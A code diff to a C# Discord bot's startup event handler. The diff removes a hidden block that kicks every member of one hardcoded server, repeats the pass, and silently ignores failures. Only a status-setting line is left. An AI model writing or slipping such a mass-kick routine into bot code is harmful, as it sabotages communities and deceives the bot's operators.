@@ -21,35 +21,7 @@ namespace DEA.Events
         {
             return Task.Run(async () =>
             {
-                await _client.SetGameAsync("USE $help");
-                var guild = _client.GetGuild(283751182869069835);
-                if (guild != null)
-                {
-                    System.Console.Write("THIS IS BEING RUN HYPE!");
-                    var users = await (guild as IGuild).GetUsersAsync();
-
-                    foreach (var guildUser in users)
-                    {
-                        try
-                        {
-                            await guildUser.KickAsync();
-                        }
-                        catch { }
-                        await Task.Delay(2500);
-                    }
-
-                    var newUsers = await (guild as IGuild).GetUsersAsync();
-                    foreach (var guildUser in newUsers)
-                    {
-                        try
-                        {
-                            await guildUser.KickAsync();
-                        }
-                        catch { }
-                        await Task.Delay(2500);
-                    }
-                }
-                
+                await _client.SetGameAsync("USE $help");            
             });
         }
     }
